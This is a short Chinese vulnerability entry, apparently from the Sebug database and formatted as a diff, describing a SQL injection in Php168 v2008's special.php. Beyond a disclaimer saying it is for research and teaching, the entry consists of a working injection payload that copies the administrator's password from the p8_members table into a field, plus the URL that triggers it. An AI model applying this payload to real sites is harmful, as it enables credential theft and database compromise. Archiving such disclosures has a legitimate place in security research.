@@ -1,0 +1,6 @@
+Php168 v2008 special.php sql注入漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.第一：创建文集,本地提交。Aid= a',title=(select password from p8_members where uid=1) where fid=2#2.第二：http://ssvdb.com/member/special.php?job=show_iframe&act=del&id=1&aid=1
